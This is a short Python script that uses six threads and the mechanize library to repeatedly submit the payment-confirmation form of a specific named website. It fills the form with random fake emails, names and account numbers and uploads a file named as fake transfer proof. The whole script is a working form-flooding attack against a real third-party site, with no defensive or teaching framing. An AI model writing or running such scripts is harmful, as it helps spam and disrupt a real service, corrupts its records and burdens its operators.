import random
import threading
import mechanize
def make_request():
  for ppp in range (10):
    br = mechanize.Browser()
    br.open("https://rajakoding.my.id/web/konfirmasi")
    br.select_form(nr=0)
    br['email']=str(random.randint(1000000,10000000))+'ooh_gitu@gmail.com'
    br.find_control(name="nama",type='text',nr=1).value=str(random.randint(1000000,10000000))
    br.find_control(name="rek_pengirim").value=str(random.randint(1000000,10000000))
    br.find_control(name="userfile").add_file(open("ini file palsu.txt"),'img/png',"bukti tf")
    b = br.submit()
    # print(b.read())
    if b is not None:
      print('berhasil '+str(ppp))
class myThread (threading.Thread):
   def __init__(self, threadID, name, counter):
      threading.Thread.__init__(self)
      self.threadID = threadID
      self.name = name
      self.counter = counter
   def run(self):
      print("start")
      make_request()
thread1 = myThread(1, "Thread-1", 1)
thread2 = myThread(2, "Thread-2", 2)
thread3 = myThread(3, "Thread-2", 3)
thread4 = myThread(4, "Thread-2", 4)
thread5 = myThread(5, "Thread-2", 5)
thread6 = myThread(6, "Thread-2", 6)
thread1.start()
thread2.start()
thread3.start()
thread4.start()
thread5.start()
thread6.start()